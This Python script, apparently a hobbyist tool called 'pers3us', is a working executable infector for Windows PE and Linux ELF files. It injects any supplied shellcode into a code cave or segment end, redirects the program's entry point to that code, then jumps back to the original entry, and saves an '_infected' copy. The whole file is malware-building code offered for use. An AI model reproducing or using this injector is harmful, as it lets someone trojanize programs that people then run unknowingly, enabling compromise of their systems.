#!/usr/bin/python3
# a multiplatform code injector made by S01den.

from termcolor import colored
from elftools.elf.elffile import ELFFile
from elftools.elf.enums import ENUM_E_MACHINE
import argparse
import pefile
import sys
import struct


def build_parser():
	""" Build argument parser """
	parser = argparse.ArgumentParser(description="A multiplatform code injector made by S01den.")
	parser.add_argument("-f", "--file", 
		type=str, default="main",
		help="select the file to infect")
	parser.add_argument("-s", "--shellcode", 
		type=str, default="main",
		help="select the file which contains the shellcode (in raw bytes)")
	return parser


def infectPE(filename, code):
	print(colored("[*] Beginning of PE infection",'green'))

	file = open(filename,'rb')
	binary = file.read()
	file.close()

	if(binary[132] == 76):
		bits = 32
	else:
		bits = 64

	pe = pefile.PE(filename)
	if(pe.DOS_HEADER.e_magic != 0x5a4d):
		print(colored("[-] Error: not a PE file",'red'))
		return 1

	trueEP = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	print(colored("[*] OEP = "+str(hex(trueEP)),'green'))

	for section in pe.sections:
		if(section.Name.decode().rstrip('\x00') == ".text"):
			textPE = section

	addrText = textPE.VirtualAddress
	offsetOEP = trueEP-addrText+textPE.PointerToRawData

	fileSC = open(code,"rb")
	shellcode = fileSC.read().strip()
	codeBytes = bytearray()
	for i in shellcode:
		codeBytes.append(i)

	if(bits == 64):
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xc0)
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xdb)
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xc9)
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xd2)
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xf6)
	else:
		codeBytes.append(0x31)
		codeBytes.append(0xc0)
		codeBytes.append(0x31)
		codeBytes.append(0xdb)
		codeBytes.append(0x31)
		codeBytes.append(0xc9)
		codeBytes.append(0x31)
		codeBytes.append(0xd2)
		codeBytes.append(0x31)
		codeBytes.append(0xf6)

	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[0])
	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[1])
	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[2])
	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[3])
	codeBytes.append(0xff)
	codeBytes.append(0xe5)

	nbrZero = 0
	for i in range(textPE.Misc_VirtualSize):
		if(binary[addrText+i] == 0):
			nbrZero += 1
		else:
			nbrZero = 0
		if(nbrZero >= len(codeBytes)):
			offsetInjection = addrText+i
			delta = offsetInjection - len(codeBytes)
			print(colored("[*] New entry point = "+str(hex(delta+addrText-textPE.PointerToRawData)),'green'))
			break

	offsetEP = 0
	for i in range(0,0x300,2):
		if(binary[i] == struct.pack('I',trueEP)[0] and binary[i+1] == struct.pack('I',trueEP)[1]):
			offsetEP = i
			break

	if(nbrZero == 0):
		print(colored("[-] No code cave found :(",'red'))
		return 1

	#print(codeBytes)

	binary = binary[:offsetEP] + struct.pack('I',delta+addrText-textPE.PointerToRawData) + binary[offsetEP+4:]
	binary = binary[:delta] + codeBytes + binary[delta+len(codeBytes):]

	newName = filename[:-4] + "_infected.exe"
	infectedFile = open(newName,"wb")
	infectedFile.write(binary)

	infectedFile.close()
	file.close()
	fileSC.close()	

	print(colored("[*] Injection d0ne !",'green'))
	print(colored("[*] New file: "+newName,'green'))


def infectELF(filename, code):
	print(colored("[*] Beginning of ELF infection",'green'))

	file = open(filename,'rb')
	binary = file.read()
	file.seek(0,0)

	bits = 32*binary[4]

	if(file.read(4) != b"\x7fELF"):
		print(colored("[-] Error, not an ELF file",'red'))
		return 0

	file.seek(0,0)

	elf = ELFFile(file)

	found_loadable = 0
	for s in elf.iter_segments():
		if s["p_type"] == "PT_LOAD" and s["p_flags"] & 1:
			segmentUse = s
			found_loadable = 1

	if(found_loadable != 0):
		print(colored("[*] Found a segment which is loadable and executable !",'green'))
	else:
		print(colored("[-] Loadable segment was not found :(",'red'))
		return 0
	
	trueEP = elf.header.e_entry
	virt_start = trueEP+segmentUse["p_vaddr"]
	endSeg = segmentUse["p_vaddr"]+segmentUse["p_filesz"]

	#here we add mov ebp, true entry point ; jmp ebp
	fileSC = open(code,"rb")
	shellcode = fileSC.read().strip()
	codeBytes = bytearray()
	for i in shellcode:
		codeBytes.append(i)

	if(bits == 64):
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xc0)
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xdb)
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xc9)
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xd2)
		codeBytes.append(0x48)
		codeBytes.append(0x31)
		codeBytes.append(0xf6)
	else:
		codeBytes.append(0x31)
		codeBytes.append(0xc0)
		codeBytes.append(0x31)
		codeBytes.append(0xdb)
		codeBytes.append(0x31)
		codeBytes.append(0xc9)
		codeBytes.append(0x31)
		codeBytes.append(0xd2)
		codeBytes.append(0x31)
		codeBytes.append(0xf6)

	codeBytes.append(0xbd)
	codeBytes.append(struct.pack('I',trueEP)[0])
	codeBytes.append(struct.pack('I',trueEP)[1])
	codeBytes.append(struct.pack('I',trueEP)[2])
	codeBytes.append(struct.pack('I',trueEP)[3])
	codeBytes.append(0xff)
	codeBytes.append(0xe5)
	#print(codeBytes)

	newHeader = elf.header
	newHeader.e_entry = endSeg-len(codeBytes)

	print(colored("[*] New entry point: "+str(hex(newHeader.e_entry)),'green'))
	print(colored("[*] OEP: "+str(hex(trueEP)),'green'))
	#print(hex(newHeader.e_entry-(segmentUse["p_vaddr"]-segmentUse["p_offset"])))

	binary = binary[:24] + struct.pack('I',newHeader.e_entry) + binary[28:]
	binary = binary[:newHeader.e_entry-segmentUse["p_vaddr"]] + codeBytes + binary[newHeader.e_entry-segmentUse["p_vaddr"]+len(codeBytes):]

	newName = filename + "_infected"
	infectedFile = open(newName,"wb")
	infectedFile.write(binary)

	infectedFile.close()
	file.close()
	fileSC.close()
	print(colored("[*] Injection d0ne !",'green'))
	print(colored("[*] New file: "+newName,'green'))

print(colored("                                        |",'red'))
print(colored("                  ,------------=--------|___________|",'red'))
print(colored(" -=============%%%|         |  |______|_|___________|",'red'))
print(colored("                  | | | | | | ||| | | | |___________|",'red'))
print(colored("                  `------------=--------|           |",'red'))
print(colored("                                        |",'red'))
print(colored("- By S01den -\n",'red'))

args = build_parser().parse_args()

if(len(sys.argv) < 3):
	print("Command: ./pers3us.py -f file_to_infect -s shellcode_file\nExample: ./pers3us.py -f foo -s shellcodeHelloWolrd")
	exit()

filename = args.file
code = args.shellcode

file = open(filename,"rb")

begin = file.read(4)

if(begin == b'\x7fELF'):
	infectELF(filename,code)
elif(begin[:2] == b'MZ'):
	infectPE(filename,code)
else:
	print(colored("Executable format not known",'red'))
